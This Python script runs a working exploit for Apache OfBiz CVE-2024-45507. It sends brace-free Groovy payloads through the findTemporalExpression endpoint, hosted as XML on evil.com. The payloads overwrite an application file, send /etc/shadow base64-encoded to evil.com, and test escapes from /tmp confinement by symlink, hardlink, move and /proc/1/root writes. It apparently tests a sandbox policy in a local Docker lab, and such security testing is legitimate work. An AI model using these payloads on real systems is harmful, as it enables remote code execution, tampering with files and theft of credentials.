# -*- coding: utf-8 -*-
"""RT5-D OFBiz: brace-free groovy payloads via CVE-2024-45507 (findTemporalExpression).
   D1: REAL-file tamper (VERSION overwrite) + allowed-path write + /etc/shadow exfil
   D2: /tmp path games: rename/move, symlink write-through, hardlink, /proc/1/root
   Ground truth: docker-exec read-only checks + infra log + dmesg.
"""
import io
import os
import subprocess

import requests
import urllib3

urllib3.disable_warnings()

HERE = os.path.dirname(os.path.abspath(__file__))
WWW = r"D:\Amywork\AgentSelf_Evolve\experiment\multi-round-lab\infrastructure\www\payloads"

G = "${groovy:"


def xml_for(name, script):
    return (
        '<?xml version="1.0" encoding="UTF-8"?>\n'
        '<screens xmlns:xsi="http://www.w3.org/2001/XMLSchema-instance"\n'
        '        xmlns="http://ofbiz.apache.org/Widget-Screen" '
        'xsi:schemaLocation="http://ofbiz.apache.org/Widget-Screen '
        'http://ofbiz.apache.org/dtds/widget-screen.xsd">\n'
        '    <screen name="TemporalExpressionDecorator">\n'
        '        <section>\n'
        '            <actions>\n'
        '                <set value="' + G + script + '}"/>\n'
        '            </actions>\n'
        '        </section>\n'
        '    </screen>\n'
        '</screens>\n'
    )


SHOTS = {
    "rt5_ofbiz_d1.xml": (
        # real-file tamper + allowed-path control + shadow exfil (GET w/ base64 param)
        "new File('/usr/src/apache-ofbiz/VERSION').setText('rt5-tamper-'+System.currentTimeMillis());"
        "new File('/run/aa-tmp/ofbiz/rt5_allowed_marker').setText('rt5');"
        "new URL('http://evil.com:8000/rt5/ofbiz_shadow?d='"
        "+java.util.Base64.getEncoder().encodeToString(new File('/etc/shadow').getText().getBytes('UTF-8')))"
        ".getContent();"
    ),
    "rt5_ofbiz_d2.xml": (
        # rename/move INTO /tmp (expect deny) + create move source first
        "new File('/usr/src/apache-ofbiz/rt5_mv_src').setText('src');"
        "java.nio.file.Files.move(java.nio.file.Paths.get('/usr/src/apache-ofbiz/rt5_mv_src'),"
        "java.nio.file.Paths.get('/tmp/rt5_moved'));"
    ),
    "rt5_ofbiz_d3.xml": (
        # symlink in app tree -> /tmp, then write through it (expect deny at resolved path)
        "java.nio.file.Files.createSymbolicLink(java.nio.file.Paths.get('/usr/src/apache-ofbiz/rt5_lnk'),"
        "java.nio.file.Paths.get('/tmp'));"
        "new File('/usr/src/apache-ofbiz/rt5_lnk/rt5_via_lnk').setText('x');"
    ),
    "rt5_ofbiz_d4.xml": (
        # hardlink to existing /tmp file (expect 'l' deny)
        "java.nio.file.Files.createLink(java.nio.file.Paths.get('/usr/src/apache-ofbiz/rt5_hard'),"
        "java.nio.file.Paths.get('/tmp/hsperfdata_root/70'));"
    ),
    "rt5_ofbiz_d5.xml": (
        # /proc/1/root path traversal write (expect deny)
        "new File('/proc/1/root/tmp/rt5_proc_root').setText('x');"
    ),
}

s = requests.Session()
s.trust_env = False
s.verify = False
s.headers["User-Agent"] = "Mozilla/5.0"

for fname, script in SHOTS.items():
    with io.open(os.path.join(WWW, fname), "w", encoding="utf-8", newline="\n") as f:
        f.write(xml_for(fname, script))
    body = "tempExprDecoratorLocation=%09http://evil.com:8000/payloads/" + fname
    try:
        r = s.post("https://127.0.0.1:18081/webtools/control/main/findTemporalExpression",
                   data=body,
                   headers={"Content-Type": "application/x-www-form-urlencoded"},
                   timeout=90, allow_redirects=False)
        print("[*] %-22s HTTP %s (%dB)" % (fname, r.status_code, len(r.content)))
    except Exception as e:  # noqa: BLE001
        print("[*] %-22s EXC %s" % (fname, e))

print("\n=== truth: app tree / tmp / allowed ===")
for p in ["/usr/src/apache-ofbiz/VERSION",
          "/usr/src/apache-ofbiz/rt5_mv_src",
          "/usr/src/apache-ofbiz/rt5_lnk",
          "/usr/src/apache-ofbiz/rt5_hard",
          "/run/aa-tmp/ofbiz/rt5_allowed_marker",
          "/tmp/rt5_moved", "/tmp/rt5_via_lnk", "/tmp/rt5_proc_root"]:
    r = subprocess.run(["docker", "exec", "multi-round-lab-ofbiz-1",
                        "ls", "-l", "--full-time", p], capture_output=True, text=True)
    print((r.stdout + r.stderr).strip())
r = subprocess.run(["docker", "exec", "multi-round-lab-ofbiz-1",
                    "cat", "/usr/src/apache-ofbiz/VERSION"], capture_output=True, text=True)
print("VERSION now: %r" % r.stdout)

print("=== infra log (rt5) ===")
r = subprocess.run(["docker", "logs", "multi-round-lab-infra-1", "--since", "5m"],
                   capture_output=True, text=True)
for line in (r.stdout + r.stderr).splitlines():
    if "/rt5/" in line or "payloads/rt5_ofbiz" in line:
        print("[infra] " + line[:400])
